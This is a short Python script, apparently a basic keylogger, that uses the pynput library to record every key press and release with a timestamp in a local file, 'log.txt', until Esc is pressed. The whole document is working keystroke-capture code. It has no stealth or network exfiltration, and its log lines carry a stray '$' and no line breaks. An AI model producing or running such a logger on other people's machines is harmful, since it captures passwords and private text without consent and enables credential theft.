from pynput.keyboard import Key, Listener
from time import *



def keylogpressed(key):

    pressed = str(key)
    try:

        if key == Key.space:
            pressed = 'SPACE'
            
        elif key == Key.tab:
            pressed = 'TAB'

        elif key == Key.enter:
            pressed = 'ENTER'

        elif key == Key.shift:
            pressed = 'SHIFT'

        elif key == Key.backspace:
            pressed = 'BACKSPACE'
        else:
            pressed = key.char

    except AttributeError:
        pressed = f'SPECIAL {key}'

    with open("log.txt", "a") as f:
        current_time = time()
        f.write(f"Key {pressed} pressed at ${current_time}")

    if key == Key.esc:
        return False

def keylogreleased(key):

    released = f'{key}'
    
    with open("log.txt", "a") as f:
        current_time = time()
        f.write(f"Key {released} released at ${current_time}")

    if key == Key.esc:
        return False



# Collect all event until released
with Listener(on_press = keylogpressed, on_release=keylogreleased) as listener:   
    listener.join()
